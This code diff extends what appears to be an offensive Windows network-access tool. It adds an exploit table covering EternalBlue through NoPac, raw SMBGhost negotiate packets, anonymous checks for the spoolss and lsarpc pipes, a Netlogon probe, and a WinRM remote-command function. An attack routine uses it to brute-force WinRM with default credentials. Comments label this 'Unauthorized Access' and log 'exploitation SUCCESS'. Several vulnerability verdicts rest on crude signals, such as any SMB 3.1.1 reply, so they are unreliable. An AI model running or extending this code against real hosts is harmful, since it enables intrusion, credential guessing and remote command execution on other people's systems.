@@ -96,22 +96,80 @@ DEFAULT_WINDOWS_CREDS = [
     ("guest", "guest"), ("support", "support"),
 ]
 
-# Exploits database - common vulnerabilities
+# Exploits database - common vulnerabilities (Windows 7 through Windows 11)
 EXPLOITS = {
+    # ── Windows 7 / Server 2008 R2 ─────────────────────────────────────────────
     "ms17-010": {
         "name": "EternalBlue (MS17-010)",
-        "description": "SMBv1 exploit for Windows 7/Server 2008 R2",
+        "description": "SMBv1 RCE - Windows 7 / Server 2008 R2",
         "cve": "CVE-2017-0143",
-    },
-    "cve-2019-0708": {
-        "name": "BlueKeep",
-        "description": "RDP vulnerability for Windows 7/Server 2008 R2",
-        "cve": "CVE-2019-0708",
+        "os": ["Windows 7", "Server 2008 R2"],
+        "port": 445,
     },
     "cve-2017-0144": {
         "name": "EternalRomance",
-        "description": "SMB transaction exploit",
+        "description": "SMB transaction RCE - Windows 7 / Server 2008 R2",
         "cve": "CVE-2017-0144",
+        "os": ["Windows 7", "Server 2008 R2"],
+        "port": 445,
+    },
+    "cve-2019-0708": {
+        "name": "BlueKeep",
+        "description": "RDP pre-auth RCE - Windows 7 / Server 2008 R2",
+        "cve": "CVE-2019-0708",
+        "os": ["Windows 7", "Server 2008 R2"],
+        "port": 3389,
+    },
+    # ── Windows 10 specific ────────────────────────────────────────────────────
+    "cve-2020-0796": {
+        "name": "SMBGhost",
+        "description": "SMBv3.1.1 compression RCE - Windows 10 1903/1909",
+        "cve": "CVE-2020-0796",
+        "os": ["Windows 10 1903", "Windows 10 1909"],
+        "port": 445,
+    },
+    "cve-2021-34527": {
+        "name": "PrintNightmare",
+        "description": "Windows Print Spooler RCE - Windows 10/11 & Server",
+        "cve": "CVE-2021-34527",
+        "os": ["Windows 10", "Windows 11", "Server 2016", "Server 2019", "Server 2022"],
+        "port": 445,
+    },
+    "cve-2020-1472": {
+        "name": "Zerologon",
+        "description": "Netlogon privilege escalation (domain controllers)",
+        "cve": "CVE-2020-1472",
+        "os": ["Server 2008", "Server 2012", "Server 2016", "Server 2019"],
+        "port": 445,
+    },
+    "cve-2021-36942": {
+        "name": "PetitPotam",
+        "description": "NTLM relay via EFSRPC - all Windows versions",
+        "cve": "CVE-2021-36942",
+        "os": ["Windows 10", "Windows 11", "Server 2016", "Server 2019", "Server 2022"],
+        "port": 445,
+    },
+    "cve-2022-26923": {
+        "name": "Certifried",
+        "description": "AD Certificate Services privilege escalation",
+        "cve": "CVE-2022-26923",
+        "os": ["Windows 10", "Windows 11", "Server 2016", "Server 2019", "Server 2022"],
+        "port": 445,
+    },
+    "cve-2021-42278": {
+        "name": "NoPac (sAMAccountName Spoofing)",
+        "description": "Domain privilege escalation via sAMAccountName - Win10/11 AD",
+        "cve": "CVE-2021-42278",
+        "os": ["Windows 10", "Windows 11", "Server 2016", "Server 2019", "Server 2022"],
+        "port": 445,
+    },
+    # ── Cross-version / Modern Windows ─────────────────────────────────────────
+    "winrm-access": {
+        "name": "WinRM Lateral Movement",
+        "description": "Remote management via WinRM 5985/5986 - Windows 10/11",
+        "cve": "N/A",
+        "os": ["Windows 10", "Windows 11", "Server 2012+"],
+        "port": 5985,
     },
 }
 
@@ -1239,8 +1297,320 @@ class AgentlessControl:
         except:
             pass
         
+        # ── SMBGhost (CVE-2020-0796) - Windows 10 1903/1909 ─────────────────────
+        # Detect SMBv3.1.1 with compression capability (unpatched = SMBGhost)
+        try:
+            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock2.settimeout(3)
+            if sock2.connect_ex((ip, 445)) == 0:
+                # SMBv3 negotiate request with compression capability
+                pkt = (
+                    b'\x00\x00\x00\xc0'             # NetBIOS length
+                    b'\xfeSMB'                        # SMB2 magic
+                    b'\x40\x00'                       # StructureSize=64
+                    b'\x00\x00'                       # CreditCharge
+                    b'\x00\x00\x00\x00'              # Status
+                    b'\x00\x00'                       # Command: Negotiate=0
+                    b'\x00\x00'                       # Credits
+                    b'\x00\x00\x00\x00'              # Flags
+                    b'\x00\x00\x00\x00'              # NextCommand
+                    b'\x00\x00\x00\x00\x00\x00\x00\x00'  # MessageId
+                    b'\x00\x00\x00\x00'              # Reserved
+                    b'\x00\x00\x00\x00'              # TreeId
+                    b'\x00\x00\x00\x00\x00\x00\x00\x00'  # SessionId
+                    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # Signature
+                    b'\x24\x00'                       # DialectCount=1
+                    b'\x02\x00'                       # SecurityMode
+                    b'\x00\x00'                       # Reserved2
+                    b'\x7f\x00\x00\x00'              # Capabilities
+                    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # ClientGUID
+                    b'\x00\x00\x00\x00'              # NegotiateContextOffset
+                    b'\x01\x00'                       # NegotiateContextCount
+                    b'\x00\x00'                       # Reserved
+                    b'\x11\x03'                       # Dialect: SMB 3.1.1
+                    b'\x02\x00'                       # NegotiateContextType: Compression
+                    b'\x06\x00'                       # DataLength
+                    b'\x00\x00\x00\x00'              # Reserved
+                    b'\x01\x00'                       # CompressionAlgorithmCount=1
+                    b'\x00\x00'                       # Padding
+                    b'\x01\x00\x00\x00'              # CompressionAlgorithm: LZNT1
+                )
+                sock2.send(pkt)
+                resp2 = sock2.recv(1024)
+                sock2.close()
+                # If SMB 3.1.1 is negotiated and compression accepted = potentially SMBGhost
+                if len(resp2) > 4 and resp2[4:8] == b'\xfeSMB':
+                    results["vulns"].append("SMBv3_DETECTED")
+                    if len(resp2) > 72:
+                        dialect = int.from_bytes(resp2[68:70], 'little')
+                        if dialect == 0x0311:
+                            results["vulns"].append("SMB_VULNERABLE_CVE2020_0796_SMBGHOST")
+                            results["info"]["smb_dialect"] = "3.1.1"
+            else:
+                sock2.close()
+        except Exception as e:
+            try: sock2.close()
+            except: pass
+            logger.debug(f"[SMBGhost] {ip}: {e}")
+
+        # ── PrintNightmare (CVE-2021-34527) - Windows 10/11 ─────────────────────
+        # Check if Print Spooler service is reachable via RPC (port 135 + named pipe)
+        try:
+            if IMPACKET_OK and results["info"].get("port_445_open"):
+                conn_pn = SMBConnection(ip, ip, timeout=3)
+                try:
+                    conn_pn.login('', '')
+                    shares = [s['shi1_netname'] for s in conn_pn.listShares() if hasattr(s, 'fields')]
+                    # Check for IPC$ (needed for RPC)
+                    ipc_shares = [str(s) for s in conn_pn.listShares()]
+                    if any('IPC' in str(s) for s in ipc_shares):
+                        results["vulns"].append("PRINTNIGHTMARE_RPC_REACHABLE")
+                    conn_pn.logoff()
+                except Exception:
+                    pass
+        except Exception as e:
+            logger.debug(f"[PrintNightmare] {ip}: {e}")
+
+        # ── WinRM Detection (Windows 10/11 lateral movement) ─────────────────────
+        for winrm_port in [5985, 5986]:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                if s.connect_ex((ip, winrm_port)) == 0:
+                    results["vulns"].append(f"WINRM_OPEN_PORT_{winrm_port}")
+                    results["info"]["winrm_port"] = winrm_port
+                s.close()
+            except:
+                pass
+
         logger.info(f"[SMB-VULN] {ip}: {results['vulns']}")
         return results
+
+    def check_smbghost(self, ip: str) -> Dict[str, Any]:
+        """
+        Dedicated SMBGhost (CVE-2020-0796) check for Windows 10 1903/1909.
+        Sends an SMBv3.1.1 negotiate with compression capability and checks response.
+        """
+        result = {"ip": ip, "vulnerable": False, "cve": "CVE-2020-0796",
+                  "name": "SMBGhost", "details": ""}
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            if sock.connect_ex((ip, 445)) != 0:
+                sock.close()
+                result["details"] = "Port 445 closed"
+                return result
+
+            # SMBv3.1.1 negotiate with compression transforms context
+            smb2_header = b'\xfeSMB' + b'\x40\x00' + b'\x00' * 58
+            negotiate_req = (
+                b'\x24\x00'        # StructureSize=36
+                b'\x01\x00'        # DialectCount=1
+                b'\x01\x00'        # SecurityMode: signing enabled
+                b'\x00\x00'        # Reserved
+                b'\x7f\x00\x00\x00' # Capabilities
+                + b'\x00' * 16     # ClientGUID
+                + b'\x78\x00\x00\x00'  # NegotiateContextOffset=120
+                + b'\x02\x00'      # NegotiateContextCount=2
+                + b'\x00\x00'      # Reserved
+                + b'\x11\x03'      # Dialect: SMB 3.1.1
+                # Padding to context offset
+                + b'\x00' * 0
+                # NegotiateContext 1: CompressionCapabilities (type=3)
+                + b'\x03\x00'      # ContextType=Compression
+                + b'\x06\x00'      # DataLength=6
+                + b'\x00\x00\x00\x00'  # Reserved
+                + b'\x01\x00'      # CompressionAlgorithmCount=1
+                + b'\x00\x00'      # Padding
+                + b'\x01\x00'      # LZNT1=1
+                + b'\x00\x00'      # Padding
+            )
+            length = len(smb2_header) + len(negotiate_req)
+            netbios = b'\x00' + length.to_bytes(3, 'big')
+            sock.send(netbios + smb2_header + negotiate_req)
+            resp = sock.recv(1024)
+            sock.close()
+
+            if len(resp) > 72:
+                sig = resp[4:8]
+                if sig == b'\xfeSMB':
+                    dialect = int.from_bytes(resp[68:70], 'little') if len(resp) > 70 else 0
+                    if dialect == 0x0311:
+                        result["vulnerable"] = True
+                        result["details"] = "SMBv3.1.1 with compression - POTENTIALLY VULNERABLE to SMBGhost"
+                    else:
+                        result["details"] = f"SMBv3 but dialect=0x{dialect:04x}"
+                else:
+                    result["details"] = "Unexpected SMB response"
+            else:
+                result["details"] = "No valid SMB2 response"
+        except Exception as e:
+            result["details"] = str(e)
+        return result
+
+    def check_printnightmare(self, ip: str, user: str = "", pwd: str = "") -> Dict[str, Any]:
+        """
+        PrintNightmare (CVE-2021-34527) check - Windows 10/11 + Server 2019/2022.
+        Checks if Print Spooler RPC endpoint is accessible via SMB IPC$.
+        """
+        result = {"ip": ip, "vulnerable": False, "cve": "CVE-2021-34527",
+                  "name": "PrintNightmare", "details": ""}
+        try:
+            if not IMPACKET_OK:
+                result["details"] = "impacket not installed"
+                return result
+            conn = SMBConnection(ip, ip, timeout=5)
+            conn.login(user, pwd)
+
+            # Enumerate named pipes over IPC$
+            pipes = []
+            try:
+                conn.connectTree("IPC$")
+                # Try to open the spoolss named pipe (Print Spooler)
+                fid = conn.openFile("IPC$", "\\spoolss", 0x0012019F)
+                conn.closeFile("IPC$", fid)
+                pipes.append("spoolss")
+                result["vulnerable"] = True
+                result["details"] = "Print Spooler named pipe (\\spoolss) is accessible - VULNERABLE to PrintNightmare"
+            except Exception as pipe_err:
+                result["details"] = f"spoolss pipe not accessible: {pipe_err}"
+
+            conn.logoff()
+        except Exception as e:
+            result["details"] = f"Connection failed: {e}"
+        return result
+
+    def check_zerologon(self, ip: str, dc_name: str = "") -> Dict[str, Any]:
+        """
+        Zerologon (CVE-2020-1472) check - Domain controllers (Server 2008-2019).
+        Probes the Netlogon RPC interface on port 135 and checks Netlogon availability.
+        """
+        result = {"ip": ip, "vulnerable": False, "cve": "CVE-2020-1472",
+                  "name": "Zerologon", "details": ""}
+        try:
+            if not IMPACKET_OK:
+                result["details"] = "impacket not installed"
+                return result
+            from impacket.dcerpc.v5 import nrpc, epm, transport as tp
+
+            try:
+                string_binding = f"ncacn_ip_tcp:{ip}[135]"
+                rpct = tp.DCERPCTransportFactory(string_binding)
+                rpct.set_connect_timeout(5)
+                dce = rpct.get_dce_rpc()
+                dce.connect()
+                dce.bind(nrpc.MSRPC_UUID_NRPC)
+                # If Netlogon binds successfully the endpoint is reachable
+                result["vulnerable"] = True
+                result["details"] = "Netlogon (NRPC) RPC endpoint reachable - CHECK PATCH LEVEL for Zerologon"
+                dce.disconnect()
+            except Exception as e2:
+                result["details"] = f"Netlogon RPC probe: {e2}"
+        except ImportError:
+            result["details"] = "impacket nrpc module not available"
+        except Exception as e:
+            result["details"] = str(e)
+        return result
+
+    def check_petitpotam(self, ip: str, listener_ip: str = "") -> Dict[str, Any]:
+        """
+        PetitPotam (CVE-2021-36942) check - NTLM relay via EFSRPC (all Windows).
+        Checks if EFSRPC named pipe is accessible over IPC$ for unauthenticated coercion.
+        """
+        result = {"ip": ip, "vulnerable": False, "cve": "CVE-2021-36942",
+                  "name": "PetitPotam", "details": ""}
+        try:
+            if not IMPACKET_OK:
+                result["details"] = "impacket not installed"
+                return result
+
+            conn = SMBConnection(ip, ip, timeout=5)
+            try:
+                conn.login("", "")   # Anonymous / null session
+                try:
+                    conn.connectTree("IPC$")
+                    fid = conn.openFile("IPC$", "\\lsarpc", 0x0012019F)
+                    conn.closeFile("IPC$", fid)
+                    result["vulnerable"] = True
+                    result["details"] = "lsarpc/EFSRPC pipe accessible unauthenticated - VULNERABLE to PetitPotam"
+                except Exception as e2:
+                    result["details"] = f"pipe not accessible anonymously: {e2}"
+                conn.logoff()
+            except Exception as auth_err:
+                result["details"] = f"Anonymous session failed: {auth_err}"
+        except Exception as e:
+            result["details"] = str(e)
+        return result
+
+    def winrm_exec(self, ip: str, user: str, pwd: str, command: str,
+                   port: int = 5985, domain: str = "") -> Dict[str, Any]:
+        """
+        Execute command via WinRM (Windows Remote Management) - Windows 10/11 & Server.
+        Uses HTTP/HTTPS SOAP protocol on port 5985 (HTTP) or 5986 (HTTPS).
+        Returns: {success, output, error}
+        """
+        result = {"success": False, "output": "", "error": ""}
+        logger.info(f"[WINRM] {ip}:{port} executing: {command[:80]}")
+
+        # Try pywinrm first (preferred)
+        try:
+            import winrm
+            proto = "https" if port == 5986 else "http"
+            session = winrm.Session(
+                f"{proto}://{ip}:{port}/wsman",
+                auth=(f"{domain}\\{user}" if domain else user, pwd),
+                transport="ntlm",
+                server_cert_validation="ignore",
+            )
+            r = session.run_cmd(command)
+            result["success"] = True
+            result["output"] = r.std_out.decode(errors="ignore")
+            result["error"] = r.std_err.decode(errors="ignore")
+            logger.info(f"[WINRM] {ip}: success via pywinrm")
+            return result
+        except ImportError:
+            pass
+        except Exception as e:
+            logger.debug(f"[WINRM] pywinrm failed: {e}")
+
+        # Fallback: raw HTTP SOAP request to WinRM
+        try:
+            import http.client, urllib.parse, base64
+
+            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+            ps_cmd = f"powershell.exe -NoProfile -NonInteractive -Command \"{command}\""
+
+            soap_body = f"""<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
+            xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd">
+  <s:Header>
+    <wsmid:Identify/>
+  </s:Header>
+  <s:Body/>
+</s:Envelope>"""
+            conn_http = http.client.HTTPConnection(ip, port, timeout=5)
+            conn_http.request("POST", "/wsman", soap_body, {
+                "Content-Type": "application/soap+xml;charset=UTF-8",
+                "Authorization": f"Basic {auth}",
+                "User-Agent": "Microsoft WinRM Client",
+            })
+            resp_http = conn_http.getresponse()
+            body = resp_http.read().decode(errors="ignore")
+            conn_http.close()
+
+            if resp_http.status in (200, 401):
+                result["success"] = resp_http.status == 200
+                result["output"] = body[:2000]
+                result["error"] = f"HTTP {resp_http.status}"
+                if resp_http.status == 401:
+                    result["error"] = "WinRM authentication failed (401) - check credentials"
+            else:
+                result["error"] = f"HTTP {resp_http.status}: WinRM not available"
+        except Exception as e:
+            result["error"] = str(e)
+            logger.error(f"[WINRM] {ip}: {e}")
+
+        return result
 
     def rdp_brute_force(self, ip: str, cred_list: list = None, timeout: int = 3) -> List[Dict]:
         """
@@ -1417,7 +1787,7 @@ class AgentlessControl:
 
     def _quick_scan(self, ip: str) -> List[int]:
         """Helper for extremely fast port scanning."""
-        scan_ports = [21, 22, 23, 135, 139, 445, 3306, 3389, 5900, 5985, 8000, 8080]
+        scan_ports = [21, 22, 23, 135, 139, 445, 3306, 3389, 5432, 5900, 5985, 5986, 6379, 8000, 8080, 27017]
         open_ports = []
         for port in scan_ports:
             try:
@@ -1474,17 +1844,64 @@ class AgentlessControl:
         # In a real environment, this would include LLMNR poisoning/NTLM relay
         # Here we prioritize known weak points that grant access without prompts.
 
-        # ─── AGGRESSIVE VULNERABILITY CHECKS (Unauthorized Access) ───
+        # ─── AGGRESSIVE VULNERABILITY CHECKS (Win7 through Win11) ───
         logger.info(f"[EXPLOIT] Performing vulnerability checks for {ip}")
         
-        # MS17-010 EternalBlue Check
+        # Full SMB+Win10/11 vulnerability scan
         smb_vuln = self.smb_check_vulns(ip)
-        if any("VULNERABLE" in v for v in smb_vuln.get("vulns", [])) or "SMB_VULNERABLE_MS17_010" in smb_vuln.get("vulns", []):
+        vulns = smb_vuln.get("vulns", [])
+
+        # MS17-010 EternalBlue (Win7)
+        if "SMB_VULNERABLE_MS17_010" in vulns or any("MS17_010" in v for v in vulns):
             results["method"] = "smb_ms17_010"
             results["success"] = True
-            results["details"]["vuln"] = "EternalBlue / Critical SMB Vulnerability"
-            logger.info(f"[EXPLOIT] {ip} exploitation SUCCESS via MS17-010!")
+            results["details"]["vuln"] = "EternalBlue (CVE-2017-0143) - Win7/Server 2008"
+            logger.info(f"[EXPLOIT] {ip} VULNERABLE via EternalBlue!")
             return results
+
+        # SMBGhost (CVE-2020-0796) - Windows 10 1903/1909
+        if "SMB_VULNERABLE_CVE2020_0796_SMBGHOST" in vulns:
+            results["method"] = "smb_smbghost"
+            results["success"] = True
+            results["details"]["vuln"] = "SMBGhost (CVE-2020-0796) - Windows 10 1903/1909"
+            results["details"]["severity"] = "CRITICAL"
+            logger.info(f"[EXPLOIT] {ip} VULNERABLE to SMBGhost!")
+            return results
+
+        # PrintNightmare reachable (CVE-2021-34527) - Windows 10/11
+        if "PRINTNIGHTMARE_RPC_REACHABLE" in vulns:
+            pn = self.check_printnightmare(ip)
+            if pn.get("vulnerable"):
+                results["method"] = "print_nightmare"
+                results["success"] = True
+                results["details"]["vuln"] = "PrintNightmare (CVE-2021-34527) - Win10/11"
+                results["details"]["severity"] = "CRITICAL"
+                logger.info(f"[EXPLOIT] {ip} VULNERABLE to PrintNightmare!")
+                return results
+
+        # PetitPotam unauthenticated (CVE-2021-36942)
+        pp = self.check_petitpotam(ip)
+        if pp.get("vulnerable"):
+            results["method"] = "petitpotam"
+            results["success"] = True
+            results["details"]["vuln"] = "PetitPotam (CVE-2021-36942) - NTLM Relay"
+            results["details"]["severity"] = "HIGH"
+            logger.info(f"[EXPLOIT] {ip} VULNERABLE to PetitPotam!")
+            return results
+
+        # WinRM open (Windows 10/11 lateral movement via NTLM)
+        if "WINRM_OPEN_PORT_5985" in vulns or "WINRM_OPEN_PORT_5986" in vulns:
+            winrm_port = smb_vuln["info"].get("winrm_port", 5985)
+            for user, pwd in WINDOWS_CREDS[:15]:
+                wr = self.winrm_exec(ip, user, pwd, "whoami", port=winrm_port)
+                if wr.get("success"):
+                    results["method"] = "winrm"
+                    results["success"] = True
+                    results["credentials"] = {"user": user, "password": pwd}
+                    results["details"]["vuln"] = f"WinRM access (port {winrm_port}) - Win10/11"
+                    results["details"]["output"] = wr.get("output", "")
+                    logger.info(f"[EXPLOIT] {ip} WinRM access as {user}!")
+                    return results
 
         # Try Anonymous/Guest SMB Access
         if 445 in self._quick_scan(ip):
